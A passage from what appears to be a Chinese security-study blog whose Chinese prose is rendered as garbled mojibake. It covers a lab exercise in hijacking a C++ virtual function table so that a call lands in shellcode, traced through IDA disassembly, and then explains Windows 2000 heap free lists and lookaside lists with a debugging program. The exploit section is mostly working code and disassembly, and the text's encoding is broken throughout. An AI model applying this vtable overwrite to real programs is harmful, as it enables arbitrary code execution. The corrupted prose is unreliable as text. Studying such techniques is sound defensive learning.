p=&amp;overflow;</span><br><span class="line">	p-&gt;test();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>overflowæ˜¯å…¨å±€ä½ç½®å®šä¹‰çš„ä¸€ä¸ªFailwestå¯¹è±¡,ä»–æœ‰ä¸€ä¸ªæˆå‘˜å˜é‡æ•°ç»„char buf[200],è¿˜æœ‰ä¸€ä¸ªè™šå‡½æ•°test</p>
<p>é€šè¿‡ä¿®æ”¹è™šå‡½æ•°è¡¨ä¸­è™šå‡½æ•°çš„åœ°å€å°±å¯ä»¥è®©p-&gt;test()è¿™ç§è°ƒç”¨æ–¹å¼ä¸Šå½“</p>
<p>è™šå‡½æ•°è¡¨æŒ‡é’ˆä½äºå¯¹è±¡çš„ç¬¬ä¸€ä¸ªæˆå‘˜ä¹‹å‰4ä¸ªå­—èŠ‚,å› æ­¤ä¸€å¼€å§‹</p>
<p><code>char *p_vtable=overflow.buf-4</code>æ­¤æ—¶p_vtableæŒ‡é’ˆå’Œoverflow.bufçš„è™šè¡¨æŒ‡é’ˆæŒ‡å‘åŒä¸€å—åœ°å€äº†</p>
<p>ç”±äºoverflowå¯¹è±¡åªæœ‰ä¸€ä¸ªè™šå‡½æ•°,å› æ­¤è™šè¡¨ä¸€å¼€å§‹å°±æ˜¯è¯¥è™šå‡½æ•°çš„å®é™…åœ°å€.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p_vtable[<span class="number">0</span>]=<span class="number">0xCC</span>;</span><br><span class="line">p_vtable[<span class="number">1</span>]=<span class="number">0x88</span>;</span><br><span class="line">p_vtable[<span class="number">2</span>]=<span class="number">0x40</span>;</span><br><span class="line">p_vtable[<span class="number">3</span>]=<span class="number">0x00</span>;</span><br></pre></td></tr></table></figure>

<p>è¿™å°±å°†è¯¥è™šå‡½æ•°çš„åœ°å€ä¿®æ”¹ä¸º0x004088CC,è¿™é‡Œæ°å¥½æ˜¯shellcodeçš„é¦–åœ°å€(éœ€è¦è°ƒè¯•ç¡®å®š)</p>
<p>ç„¶åp&#x3D;&amp;overflow,pæŒ‡é’ˆæŒ‡å‘overflowå¯¹è±¡</p>
<p>é€šè¿‡æŒ‡é’ˆè°ƒç”¨å¯¹è±¡çš„è™šå‡½æ•°,éœ€è¦å»æŸ¥è™šå‡½æ•°è¡¨,åº”è¯¥è°ƒç”¨å“ªä¸€ä¸ªå‡½æ•°,è€Œè™šå‡½æ•°è¡¨ç›¸åº”ä½ç½®çš„å‡½æ•°åœ°å€å·²ç»è¢«ä¿®æ”¹ä¸ºshellcodeçš„åœ°å€.</p>
<p>p-&gt;test()æœ¬æ¥åº”è¯¥æ˜¯æ‰§è¡Œoverflowçš„ç¬¬ä¸€ä¸ªä¹Ÿæ˜¯å”¯ä¸€ä¸€ä¸ªè™šå‡½æ•°,ä½†æ‰§è¡Œäº†shellcode</p>
<h3 id="è°ƒè¯•è§‚å¯Ÿ"><a href="#è°ƒè¯•è§‚å¯Ÿ" class="headerlink" title="è°ƒè¯•è§‚å¯Ÿ"></a>è°ƒè¯•è§‚å¯Ÿ</h3><p>è¿™ä¸ªç¨‹åºåœ¨win11,winXP,win2kä¸Šéƒ½å¯ä»¥å¼¹çª—,ç›´æ¥åœ¨win11ä¸Šç”¨idaåˆ†æ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">.text:00401050 push    esi</span><br><span class="line">.text:00401051 push    edi</span><br><span class="line">.text:00401052 mov     edi, offset shellcode</span><br><span class="line">.text:00401057 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:0040105A xor     eax, eax</span><br><span class="line">.text:0040105C mov     byte ptr overflow_vtable, 0CCh</span><br><span class="line">.text:00401063 repne scasb</span><br><span class="line">.text:00401065 not     ecx</span><br><span class="line">.text:00401067 sub     edi, ecx</span><br><span class="line">.text:00401069 mov     byte ptr overflow_vtable+1, 88h</span><br><span class="line">.text:00401070 mov     eax, ecx</span><br><span class="line">.text:00401072 mov     esi, edi</span><br><span class="line">.text:00401074 mov     edi, offset overflow_buf</span><br><span class="line">.text:00401079 mov     byte ptr overflow_vtable+2, 40h ; &#x27;@&#x27;</span><br><span class="line">.text:00401080 shr     ecx, 2</span><br><span class="line">.text:00401083 mov     byte ptr overflow_vtable+3, 0</span><br><span class="line">.text:0040108A rep movsd</span><br><span class="line">.text:0040108C mov     ecx, eax</span><br><span class="line">.text:0040108E and     ecx, 3</span><br><span class="line">.text:00401091 rep movsb</span><br><span class="line">.text:00401093 mov     edx, overflow_vtable</span><br><span class="line">.text:00401099 mov     ecx, offset overflow_vtable</span><br><span class="line">.text:0040109E mov     p, ecx</span><br><span class="line">.text:004010A4 call    dword ptr [edx]</span><br><span class="line">.text:004010A6 pop     edi</span><br><span class="line">.text:004010A7 pop     esi</span><br><span class="line">.text:004010A8 retn</span><br><span class="line">.text:004010A8 _main endp</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>mov     byte ptr overflow_vtable, 0CCh</code>ä¿®æ”¹è™šå‡½æ•°åœ°å€ä¹‹å‰,çœ‹çœ‹æ­¤æ—¶overflow_vtableä¸Šæ”¾ç€çš„å®é™…çš„è™šå‡½æ•°åœ°å€æ˜¯è°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data:00408818 overflow_vtable dd 4070C0h              ; DATA XREF: sub_401010â†‘w</span><br><span class="line">.data:00408818                                         ; _main+Câ†‘w ...</span><br></pre></td></tr></table></figure>

<p>è¯¥è™šå‡½æ•°çš„å®é™…åœ°å€æ˜¯0x4070C0</p>
<p>åˆ°è¿™é‡Œçœ‹çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.rdata:004070C0 off_4070C0 dd offset sub_401020         ; DATA XREF: sub_401010â†‘o</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œåˆæ˜¯ä¸€ä¸ªåœ°å€,å»sub_401020çœ‹çœ‹</p>
<p>thiscallè°ƒç”¨çº¦å®šä¸­ecxç”¨æ¥ä¼ é€’thisæŒ‡é’ˆ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:00401020 sub_401020 proc near                    ; DATA XREF: .rdata:off_4070C0â†“o</span><br><span class="line">.text:00401020 push    offset aClassVtableTes          ; &quot;Class Vtable::test()&quot;</span><br><span class="line">.text:00401025 mov     ecx, offset dword_4088F0        ; this</span><br><span class="line">.text:0040102A call    ??6ostream@@QAEAAV0@PBD@Z       ; ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:0040102F push    offset sub_4010D0</span><br><span class="line">.text:00401034 push    0Ah                             ; int</span><br><span class="line">.text:00401036 mov     ecx, eax                        ; this</span><br><span class="line">.text:00401038 call    ??6ostream@@QAEAAV0@E@Z         ; ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:0040103D mov     ecx, eax</span><br><span class="line">.text:0040103F call    sub_4010B0</span><br><span class="line">.text:00401044 retn</span><br><span class="line">.text:00401044 sub_401020 endp</span><br></pre></td></tr></table></figure>

<p>è™šå‡½æ•°åœ°å€ä¿®æ”¹å®Œæ¯•,shellcodeä¹Ÿå†™å…¥å®Œæ¯•äº†,æ­¤æ—¶è¦è°ƒç”¨è™šå‡½æ•°äº†,ä¸”çœ‹è¿™é‡Œçš„æ±‡ç¼–æŒ‡ä»¤æ˜¯å•¥æ ·çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00401093 mov     edx, overflow_vtable</span><br><span class="line">.text:00401099 mov     ecx, offset overflow_vtable;è®¾ç½®thisæŒ‡é’ˆ</span><br><span class="line">.text:0040109E mov     p, ecx;æ— æ„ä¹‰</span><br><span class="line">.text:004010A4 call    dword ptr [edx];è§£å¼•ç”¨,è°ƒç”¨è™šå‡½æ•°è¡¨çš„ç¬¬ä¸€ä¸ªå‡½æ•°</span><br></pre></td></tr></table></figure>

<p>å•æ­¥æ­¥å…¥è¿™ä¸ªcallå°±åˆ°äº†shellcodeåŒºåŸŸäº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data:0040881C overflow_buf:                           ; DATA XREF: _main+24â†‘o</span><br><span class="line">.data:0040881C cld</span><br><span class="line">.data:0040881D push    1E380A6Ah</span><br><span class="line">.data:00408822 push    4FD18963h</span><br><span class="line">.data:00408827 push    0C917432h</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
















      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/20/windows%E5%A0%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/20/windows%E5%A0%86/" class="post-title-link" itemprop="url">windows2000 å †æº¢å‡º</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-09-20 22:06:00 / Modified: 22:06:13" itemprop="dateCreated datePublished" datetime="2022-09-20T22:06:00+08:00">2022-09-20</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="windowså †"><a href="#windowså †" class="headerlink" title="windowså †"></a>windowså †</h1><h2 id="å †æ•°æ®ç»“æ„"><a href="#å †æ•°æ®ç»“æ„" class="headerlink" title="å †æ•°æ®ç»“æ„"></a>å †æ•°æ®ç»“æ„</h2><p>windowsçš„å †ç”±å †å—å’Œå †è¡¨ç»„æˆ</p>
<p>å †è¡¨:ä¸€èˆ¬ä½äºå †åŒºçš„èµ·å§‹ä½ç½®,ç”¨äºç´¢å¼•æ‰€æœ‰å †å—,åŒ…æ‹¬å †å—ä½ç½®,å¤§å°,æ˜¯å¦ç©ºé—²</p>
<p>å †å—:æ€§èƒ½åŸå› ,ä¸€èˆ¬åˆ†ä¸ºå¤§å°ä¸åŒçš„å—.æ¯ä¸ªå †å—éƒ½åˆ†ä¸ºä¸¤éƒ¨åˆ†,å—é¦–å’Œå—èº«.å…¶ä¸­å—é¦–åŒ…å«äº†æè¿°æœ¬å †å—çš„ä¿¡æ¯,åŒ…æ‹¬å¤§å°,æ˜¯å¦ç©ºé—²ç­‰.å—èº«ç´§è·Ÿåœ¨å—é¦–åé¢</p>
<p>ç”³è¯·å †ç©ºé—´çš„å‡½æ•°æ¯”å¦‚malloc,newç­‰,å…¶è¿”å›çš„åœ°å€æ˜¯å—èº«èµ·å§‹åœ°å€</p>
<p>å ç”¨çš„å †å—è¢«ä½¿ç”¨å®ƒçš„ç¨‹åºç´¢å¼•.ç©ºé—²çš„å †å—è¢«å †è¡¨ç´¢å¼•</p>
<h3 id="å †è¡¨æ•°æ®ç»“æ„"><a href="#å †è¡¨æ•°æ®ç»“æ„" class="headerlink" title="å †è¡¨æ•°æ®ç»“æ„"></a>å †è¡¨æ•°æ®ç»“æ„</h3><p>ç©ºé—²åŒå‘é“¾è¡¨<code>Freelist</code>,ç©ºè¡¨</p>
<p>å¿«é€Ÿå•å‘é“¾è¡¨<code>Lookaside</code>,å¿«è¡¨</p>
<h3 id="Freelist"><a href="#Freelist" class="headerlink" title="Freelist"></a>Freelist</h3><p>ç©ºé—²å †å—çš„å—é¦–æœ‰ä¸¤ä¸ªæŒ‡é’ˆ,ç”¨äºå°†å¤šä¸ªå †å—é“¾æ¥æˆåŒå‘é“¾è¡¨</p>
<p>å †è¡¨åŒºæœ‰ä¸€ä¸ª128é¡¹çš„æŒ‡é’ˆæ•°ç»„,ç©ºè¡¨ç´¢å¼•ç”»åœ¨å›¾ä¸Šå°±é•¿è¿™æ ·</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919081803916.png" alt="image-20220919081803916"></p>
<p>æ¯ä¸ªç©ºè¡¨ç´¢å¼•åé¢æ‹‰ç€ä¸€æºœå…¨éƒ½æ˜¯ä¸€æ ·å¤§å°çš„å †å—</p>
<p>ç©ºè¡¨ç´¢å¼•<code>free[n]</code>åé¢æ‹‰ç€çš„å †å—å¤§å°éƒ½æ˜¯$n\times 8\ byte$</p>
<p>ç‰¹åˆ«çš„æ˜¯<code>free[0]</code>,å…¶ä¸­çš„å †å—éƒ½æ˜¯<code>1024</code>ä»¥ä¸Šçš„,å¹¶ä¸”æŒ‰ç…§å¤§å°ä¸é™æ‹‰æºœ</p>
<p>ç©ºè¡¨ç´¢å¼•å°±æ˜¯åŒ…å«<strong>ä¸¤ä¸ªæŒ‡é’ˆçš„ç»“æ„ä½“</strong>,ä¸¤ä¸ªæŒ‡é’ˆåˆ†åˆ«æŒ‡å‘æ‹‰æºœçš„å¤´å’Œè…š.</p>
<p>ç›¸å½“äº</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FreeListIndex</span>&#123;</span></span><br><span class="line">	FreelistNode * first;</span><br><span class="line">	FreelistNode * last;</span><br><span class="line">&#125;FreeList[<span class="number">128</span>];</span><br></pre></td></tr></table></figure>

<p>æ„æ€æ„æ€å°±è¡Œäº†</p>
<h3 id="Lookaside"><a href="#Lookaside" class="headerlink" title="Lookaside"></a>Lookaside</h3><p>å—è¡¨ç”¨æ¥åŠ é€Ÿå †åˆ†é…,å—è¡¨æ˜¯å•å‘é“¾è¡¨,ä¸ä¼šå‘ç”Ÿå †å—åˆå¹¶</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220919082249956.png" alt="image-20220919082249956"></p>
<p>æ¯ä¸ªlookaside[n]èŠ‚ç‚¹,<strong>åé¢æœ€å¤šæ‹‰4ä¸ªèŠ‚ç‚¹</strong></p>
<p>åé¢æœ€å¤šæ‹‰4ä¸ªèŠ‚ç‚¹,åé¢æœ€å¤šæ‹‰4ä¸ªèŠ‚ç‚¹,åé¢æœ€å¤šæ‹‰4ä¸ªèŠ‚ç‚¹</p>
<h2 id="å †æ“ä½œ"><a href="#å †æ“ä½œ" class="headerlink" title="å †æ“ä½œ"></a>å †æ“ä½œ</h2><p>å¯¹æ“ä½œåˆ†ä¸ºå †å—åˆ†é…,å †å—é‡Šæ”¾,å †å—åˆå¹¶</p>
<p>å…¶ä¸­åˆ†é…é‡Šæ”¾æ˜¯ç¨‹åºå‘˜åœ¨ç¨‹åºä¸­è§„å®šçš„,å †å—åˆå¹¶ç”±æ•°æ®ç»“æ„è‡ªå·±ç®¡ç†</p>
<h3 id="å †å—åˆ†é…"><a href="#å †å—åˆ†é…" class="headerlink" title="å †å—åˆ†é…"></a>å †å—åˆ†é…</h3><p>å¿«è¡¨åˆ†é…,æ™®é€šç©ºè¡¨åˆ†é…,0å·ç©ºè¡¨åˆ†é…</p>
<h4 id="å¿«è¡¨åˆ†é…"><a href="#å¿«è¡¨åˆ†é…" class="headerlink" title="å¿«è¡¨åˆ†é…"></a>å¿«è¡¨åˆ†é…</h4><p>1.æ‰¾åˆ°å¤§å°åŒ¹é…çš„ç©ºé—²å †å—</p>
<p>2.å°†è¯¥å †å—çš„çŠ¶æ€ä¿®æ”¹ä¸ºå ç”¨</p>
<p>3.ä»å †è¡¨ä¸­æŠŠä»–å¸ä¸‹,ä¹Ÿå°±æ˜¯å…¶å‰é©±æŒ‡å‘å…¶åç»§</p>
<p>4.è¿”å›å †å—å—èº«é¦–åœ°å€ç»™ç¨‹åºæŒ‡é’ˆæ‰˜ç®¡</p>
<h4 id="æ™®é€šç©ºè¡¨åˆ†é…"><a href="#æ™®é€šç©ºè¡¨åˆ†é…" class="headerlink" title="æ™®é€šç©ºè¡¨åˆ†é…"></a>æ™®é€šç©ºè¡¨åˆ†é…</h4><p>å¯»æ‰¾èƒ½å¤Ÿæ»¡è¶³ç©ºé—´è¦æ±‚çš„æœ€å°å †å—</p>
<h4 id="é›¶å·ç©ºè¡¨åˆ†é…"><a href="#é›¶å·ç©ºè¡¨åˆ†é…" class="headerlink" title="é›¶å·ç©ºè¡¨åˆ†é…"></a>é›¶å·ç©ºè¡¨åˆ†é…</h4><p>å¯¹äºå¸Œæœ›åˆ†é…çš„ç©ºé—´å¤§å°x,é¦–å…ˆåå‘æœç´¢æœ€åä¸€ä¸ªé›¶å·å †å—,ç”±äºé›¶å·ç©ºè¡¨åªå¢ä¸å‡,æœ€åä¸€ä¸ªé›¶å·å †å—æ˜¯æœ€å¤§çš„,å¦‚æœæœ€å¤§çš„å †å—æ²¡æœ‰xå¤§,åˆ™é›¶å·ç©ºè¡¨åˆ†é…å¤±è´¥</p>
<p>å¦åˆ™ä»å¤´å¼€å§‹å¯»æ‰¾ç¬¬ä¸€ä¸ªå¯ä»¥å®¹çº³xçš„å †å—</p>
<h4 id="ç©ºè¡¨æ‰¾é›¶é’±ç°è±¡"><a href="#ç©ºè¡¨æ‰¾é›¶é’±ç°è±¡" class="headerlink" title="ç©ºè¡¨æ‰¾é›¶é’±ç°è±¡"></a>ç©ºè¡¨æ‰¾é›¶é’±ç°è±¡</h4><p>å¦‚æœæ²¡æœ‰ç²¾ç¡®åŒ¹é…å¸Œæœ›åˆ†é…ç©ºé—´å¤§å°çš„å †å—,åˆ™æ‹¿ä¸€ä¸ªå¤§å †å—,ç²¾ç¡®å‰²å‡ºéœ€è¦çš„ç©ºé—´å¤§å°,ç„¶åå‰©ä¸‹çš„é‡æ–°æ ‡æ³¨å—é¦–é“¾æ¥åˆ°ç©ºè¡¨ä¸­</p>
<p>å¿«è¡¨åªæœ‰ç²¾ç¡®åŒ¹é…æ—¶æ‰ä¼šåˆ†é…,ä¸ä¼šå‘ç”Ÿæ‰¾é›¶é’±ç°è±¡</p>
<h3 id="å †å—é‡Šæ”¾"><a href="#å †å—é‡Šæ”¾" class="headerlink" title="å †å—é‡Šæ”¾"></a>å †å—é‡Šæ”¾</h3><p>1.ä¿®æ”¹å †å—çŠ¶æ€ä¸ºç©ºé—²</p>
<p>2.å †å—é‡æ–°è¿å…¥å †è¡¨æœ«å°¾</p>
<h3 id="å †å—åˆå¹¶"><a href="#å †å—åˆå¹¶" class="headerlink" title="å †å—åˆå¹¶"></a>å †å—åˆå¹¶</h3><p>å°†ä¸¤ä¸ªå—ä»<strong>ç©ºè¡¨</strong>å¸ä¸‹,åˆå¹¶å †å—,åˆå¹¶å—é¦–ä¿¡æ¯,ç„¶åå°†è¯¥å †å—é‡æ–°è¿å…¥ç©ºé—²é“¾è¡¨</p>
<p>å¿«è¡¨ä¸­çš„ç©ºé—²å—éƒ½ä¼šè¢«è®¾ç½®ä¸ºå ç”¨çŠ¶æ€,ä¸å‚ä¸å †å—åˆå¹¶</p>
<h4 id="å†…å­˜ç´§ç¼©"><a href="#å†…å­˜ç´§ç¼©" class="headerlink" title="å†…å­˜ç´§ç¼©"></a>å†…å­˜ç´§ç¼©</h4><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20220919092345723.png" alt="image-20220919092345723"></p>
<h3 id="å †åˆ†é…é‡Šæ”¾ç®—æ³•"><a href="#å †åˆ†é…é‡Šæ”¾ç®—æ³•" class="headerlink" title="å †åˆ†é…é‡Šæ”¾ç®—æ³•"></a>å †åˆ†é…é‡Šæ”¾ç®—æ³•</h3><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20220919092818744.png" alt="image-20220919092818744"></p>
<p>ä¸‹é¢è°ƒè¯•éªŒè¯ä¸Šè¿°æ•°æ®ç»“æ„å’Œæ“ä½œ</p>
<h2 id="å †è°ƒè¯•"><a href="#å †è°ƒè¯•" class="headerlink" title="å †è°ƒè¯•"></a>å †è°ƒè¯•</h2><p>ä¹¦ä¸Šè°ƒè¯•çš„ç¨‹åºé•¿è¿™æ ·</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1,h2,h3,h4,h5,h6;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">3</span>);</span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">5</span>);</span><br><span class="line">	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">6</span>);</span><br><span class="line">	h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">19</span>);</span><br><span class="line">	h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//free block and prevent coaleses</span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h1); <span class="comment">//free to freelist[2] </span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h3); <span class="comment">//free to freelist[2] </span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h5); <span class="comment">//free to freelist[4]</span></span><br><span class="line">	</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h4); <span class="comment">//coalese h3,h4,h5,link the large block to freelist[8]</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸ƒè¡Œç”¨int 3æŒ‡ä»¤ä¸‹æ–­ç‚¹è®©ç¨‹åºåœä¸‹,ä»è¿™é‡Œé™„åŠ è°ƒè¯•å™¨,å› ä¸ºå¦‚æœç›´æ¥ä»å¤´è°ƒè¯•è¿è¡Œçš„è¯,å †ä¼šè£…å­™å­,ä¸ä½¿ç”¨å¿«è¡¨</p>
<p>é¦–å…ˆè¦äº†è§£ä¸€ä¸‹è¿™å‡ ä¸ªAPIçš„ä½œç”¨</p>
<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><h4 id="HeapCreate"><a href="#HeapCreate" class="headerlink" title="HeapCreate"></a>HeapCreate</h4><p>åœ¨è¿›ç¨‹åœ°å€ç©ºé—´ä¸­åˆ›å»ºè¾…åŠ©å †</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">HeapCreate</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] DWORD  flOptions,<span class="comment">//å †ä¸Šçš„æ“ä½œç±»å‹,åŒ…æ‹¬è¯»å†™æ‰§è¡Œç­‰</span></span></span><br><span class="line"><span class="params">  [in] SIZE_T dwInitialSize,<span class="comment">//å¼€å§‹æ—¶åˆ†é…ç»™å †çš„å­—èŠ‚æ•°</span></span></span><br><span class="line"><span class="params">  [in] SIZE_T dwMaximumSize<span class="comment">//å †æœ€å¤§çš„å­—èŠ‚æ•°,0åˆ™è¡¨ç¤ºæ— ä¸Šé™</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>è¿”å›å€¼æ˜¯è¯¥å †ç©ºé—´çš„å¥æŸ„,ä¹Ÿå°±æ˜¯åŸºåœ°å€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·ç”¨çš„æ„æ€æ˜¯,æ²¡æœ‰è®¿é—®é™åˆ¶,åˆå§‹æ—¶åˆ†ç»™0x1000å­—èŠ‚çš„å †ç©ºé—´,æœ€å¤§å¯ä»¥è¦0x10000å­—èŠ‚çš„å †ç©ºé—´,å°†è¯¥å †ç©ºé—´çš„å¥æŸ„äº¤ç»™hpå˜é‡ä¿ç®¡</p>
<h4 id="HeapAlloc"><a href="#HeapAlloc" class="headerlink" title="HeapAlloc"></a>HeapAlloc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DECLSPEC_ALLOCATOR LPVOID <span class="title function_">HeapAlloc</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HANDLE hHeap,</span></span><br><span class="line"><span class="params">  [in] DWORD  dwFlags,</span></span><br><span class="line"><span class="params">  [in] SIZE_T dwBytes</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>hHeapæ˜¯å †ç©ºé—´çš„å¥æŸ„,å¯ä»¥æ˜¯HeapCreateæˆ–è€…GetProcessHeapçš„è¿”å›å€¼</p>
<p>å…¶ä¸­HeapCreateæ˜¯æˆ‘ä»¬æ‰‹åŠ¨ç”³è¯·çš„å †ç©ºé—´,GetProcessHeapæ˜¯è¿›ç¨‹å †ç©ºé—´,è¿™ä¸ªåœ¨ç¨‹åºè¿è¡Œå¼€å§‹å°±æœ‰äº†</p>
<p>å¦‚æœå‡½æ•°è°ƒç”¨æˆåŠŸåˆ™è¿”å›ç”³è¯·ç©ºé—´çš„åŸºåœ°å€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">3</span>);</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·ç”¨çš„æ„æ€æ˜¯,ä»åˆšæ‰HeapCreateåˆ›å»ºçš„å †ç©ºé—´ä¸­è¦ä¸€å—3å­—èŠ‚çš„ç©ºé—´,è¯¥å—ç©ºé—´å°†ä¼šè¢«åˆå§‹åŒ–ä¸º0</p>
<h4 id="HeapFree"><a href="#HeapFree" class="headerlink" title="HeapFree"></a>HeapFree</h4><p>é‡Šæ”¾HeapAllocæˆ–è€…HeapReAllocç”³è¯·çš„å †ç©ºé—´</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">HeapFree</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HANDLE                 hHeap,</span></span><br><span class="line"><span class="params">  [in] DWORD                  dwFlags,</span></span><br><span class="line"><span class="params">  [in] _Frees_ptr_opt_ LPVOID lpMem</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HeapFree(hp,<span class="number">0</span>,h1);</span><br></pre></td></tr></table></figure>

<p>å°†h1è¿™ä¸€å°å—è¿˜ç»™hp</p>
